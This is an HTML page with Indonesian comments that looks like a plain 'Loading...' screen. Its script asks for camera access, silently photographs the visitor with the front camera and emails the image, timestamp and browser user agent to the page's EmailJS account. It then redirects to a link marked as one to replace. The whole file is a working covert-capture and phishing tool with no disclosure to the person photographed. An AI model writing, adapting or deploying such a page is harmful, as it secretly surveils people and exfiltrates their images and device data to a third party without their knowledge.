<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>WELCOME</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      text-align: center;
    }

    .loader {
      border: 4px solid #1e293b;
      border-top: 4px solid #38bdf8;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: auto;
      margin-bottom: 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .error {
      color: #f87171;
      margin-top: 15px;
      font-size: 14px;
    }
  </style>
</head>
<body>

<div class="box">
  <div class="loader"></div>
  <h3 id="status">Loading...</h3>
  <div id="error" class="error"></div>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="300" height="225" style="display:none;"></canvas>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
// ✅ EmailJS config kamu
(function(){
    emailjs.init("buxVv6sNpKGz4iBzb");
})();

const video = document.getElementById("video");
const statusText = document.getElementById("status");
const errorText = document.getElementById("error");

// START kamera
startCamera();

async function startCamera() {
    try {
        // WAJIB izin kamera
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });

        video.srcObject = stream;

        statusText.innerText = "Loading...";

        setTimeout(ambilFoto, 2000);

    } catch (err) {
        // ❌ kalau user nolak
        statusText.innerText = "Akses kamera ditolak!";
        errorText.innerText = "Silakan izinkan kamera untuk melanjutkan.";

        // ❗ TIDAK ADA REDIRECT
        console.log("User menolak kamera:", err);
    }
}

// ambil foto
function ambilFoto() {
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL("image/png");

    statusText.innerText = "Mengirim data...";

    emailjs.send("service_lzuezkd", "template_33st1em", {
        message: "Foto berhasil diambil",
        image: imageData,
        time: new Date().toLocaleString(),
        device: navigator.userAgent
    })
    .then(() => {
        statusText.innerText = "Berhasil! Mengalihkan...";

        setTimeout(() => {
            window.location.href = "https://google.com"; // GANTI LINK TUJUAN
        }, 3000);
    })
    .catch(() => {
        statusText.innerText = "Gagal mengirim, tapi lanjut...";

        setTimeout(() => {
            window.location.href = "https://google.com";
        }, 3000);
    });
}
</script>

</body>
</html>
